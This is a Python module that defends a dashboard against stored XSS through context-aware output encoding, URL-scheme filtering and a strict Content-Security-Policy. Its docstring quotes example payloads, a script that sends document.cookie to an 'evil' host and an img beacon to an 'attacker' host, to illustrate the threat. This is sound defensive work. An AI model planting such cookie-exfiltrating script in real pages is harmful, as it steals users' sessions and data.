"""Output-encoding chokepoint + strict CSP for the dashboard (UNFILED-XSS).

The dashboard renders **tainted ledger text** — ``ObserverEvent.detail``, ``RunInfo.version``,
item ids, metric labels — into HTML on a loopback page. Scrubbing (``ScrubbingStore``) removes
*secrets*; it does **not** neutralize markup. A poisoned ticket body that surfaces as an event
``detail`` can carry ``<script>fetch('http://evil/'+document.cookie)</script>`` or an
``<img src=http://attacker/leak>`` SSRF beacon. On a loopback dashboard, stored XSS can read
other data the page has loaded and beacon it off-host — **the loopback bind is not a mitigation
for XSS** (it limits *who* reaches the page, not what injected script does once loaded).

So every model-derived / fluid field passes through :func:`encode_field` (context-aware) before
it reaches the HTML, and every HTML response carries a strict CSP (:data:`CSP`) plus
``nosniff`` / ``no-referrer`` (:data:`SECURITY_HEADERS`). The two are **defense in depth**:
encoding renders the payload inert, and the CSP blocks both an injected ``<script>`` and an
off-host ``<img>``/``fetch`` SSRF beacon even if encoding were bypassed.

Only ``pipeline`` / ``kind`` / ``status`` / ``severity`` are trusted (stable static
identifiers — ``observe.py:67`` docstring); everything else is encoded.
"""

from __future__ import annotations

from enum import Enum

__all__ = [
    "Encoding",
    "encode_field",
    "safe_url",
    "CSP",
    "SECURITY_HEADERS",
    "REJECTED_URL",
]


class Encoding(str, Enum):
    """The render context a tainted value lands in. ``(str, Enum)`` per ADR 0004.

    The encoding is *context-aware*: the same value is escaped differently for an HTML body,
    a quoted attribute, or a URL slot — escaping for the wrong context is the classic XSS
    bypass, so the caller names the context explicitly.
    """

    #: HTML element body text (between tags): ``<td>{here}</td>``.
    HTML_BODY = "html_body"
    #: A double-quoted attribute value: ``<span title="{here}">``.
    ATTR = "attr"
    #: A URL slot (``href``/``src``): rejected unless it is https / a same-origin relative path.
    URL = "url"


#: What :func:`safe_url` substitutes for a rejected (non-https / non-relative) URL. A constant
#: so a test can assert the rejection deterministically, and so a ``javascript:`` / off-host
#: scheme can never round-trip into an ``href`` even if a caller forgets to branch on it.
REJECTED_URL = "about:blank#blocked"

# Entity map for HTML-body context. ``&`` first so we never double-encode the entities we add.
_HTML_BODY_ENTITIES = (
    ("&", "&amp;"),
    ("<", "&lt;"),
    (">", "&gt;"),
    ('"', "&quot;"),
    ("'", "&#x27;"),
)

# Attribute context additionally neutralizes the characters that can break out of a quoted
# attribute or smuggle an event handler (``=`` / backtick / whitespace are encoded so an
# unquoted-attribute mistake downstream still cannot grow a new attribute).
_ATTR_ENTITIES = _HTML_BODY_ENTITIES + (
    ("`", "&#x60;"),
    ("=", "&#x3d;"),
    ("\n", "&#x0a;"),
    ("\r", "&#x0d;"),
    ("\t", "&#x09;"),
    (" ", "&#x20;"),
)

#: Schemes allowed in a URL slot. Everything else (``javascript:``, ``data:``, ``http:`` to an
#: arbitrary host, ``vbscript:``) is rejected — kills both script execution and off-host SSRF.
_ALLOWED_URL_SCHEMES = ("https://",)


def _escape(value: str, table: tuple[tuple[str, str], ...]) -> str:
    for needle, repl in table:
        value = value.replace(needle, repl)
    return value


def safe_url(value: str) -> str:
    """Return ``value`` if it is a safe URL, else :data:`REJECTED_URL`.

    Safe means an ``https://`` absolute URL or a **same-origin relative path** (starts with a
    single ``/`` but not ``//``, which is a protocol-relative off-host URL). Everything else —
    ``javascript:``, ``data:``, ``vbscript:``, bare ``http:``, or a protocol-relative ``//host``
    — is rejected. The check is scheme-first and case-insensitive, and strips leading control/
    whitespace an attacker uses to hide a scheme (``"\\x01javascript:"``).
    """
    raw = value.strip().lstrip("\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r ")
    low = raw.lower()
    # A same-origin relative path: one leading slash, not a protocol-relative ``//host``.
    if raw.startswith("/") and not raw.startswith("//"):
        return raw
    if any(low.startswith(scheme) for scheme in _ALLOWED_URL_SCHEMES):
        return raw
    return REJECTED_URL


def encode_field(value: object, ctx: Encoding = Encoding.HTML_BODY) -> str:
    """Encode a (possibly tainted) field for ``ctx`` — the single render chokepoint.

    ``value`` is coerced to ``str`` first (a model-derived field may be a number/None). For
    :attr:`Encoding.HTML_BODY` / :attr:`Encoding.ATTR` the markup-significant characters are
    entity-encoded so an injected ``<script>`` / ``onerror=`` renders as inert text. For
    :attr:`Encoding.URL` the value is passed through :func:`safe_url` (rejecting
    ``javascript:`` / off-host schemes) **and** attribute-encoded, so the result is safe to
    drop into a quoted ``href``/``src``.
    """
    text = "" if value is None else str(value)
    if ctx is Encoding.URL:
        # Reject dangerous schemes first, then attribute-encode the survivor.
        return _escape(safe_url(text), _ATTR_ENTITIES)
    if ctx is Encoding.ATTR:
        return _escape(text, _ATTR_ENTITIES)
    return _escape(text, _HTML_BODY_ENTITIES)


#: The strict Content-Security-Policy on every HTML response (UNFILED-XSS). ``default-src
#: 'none'`` denies everything by default; only same-origin script/style/img/connect are
#: allowed (the no-build JS/CSS ship as same-origin static files), so an injected ``<script>``
#: has no source and an off-host ``<img>``/``fetch`` beacon is blocked. No inline scripts/styles
#: (no ``'unsafe-inline'``), so even an injected inline handler cannot run.
CSP = (
    "default-src 'none'; "
    "script-src 'self'; "
    "style-src 'self'; "
    "img-src 'self'; "
    "connect-src 'self'; "
    "base-uri 'none'; "
    "form-action 'none'; "
    "frame-ancestors 'none'"
)

#: Headers added to every HTML response alongside the CSP. ``nosniff`` stops a tainted body
#: being re-interpreted as HTML/JS; ``no-referrer`` stops a navigation leaking the loopback URL.
SECURITY_HEADERS: tuple[tuple[str, str], ...] = (
    ("Content-Security-Policy", CSP),
    ("X-Content-Type-Options", "nosniff"),
    ("Referrer-Policy", "no-referrer"),
    ("Cache-Control", "no-store"),
)
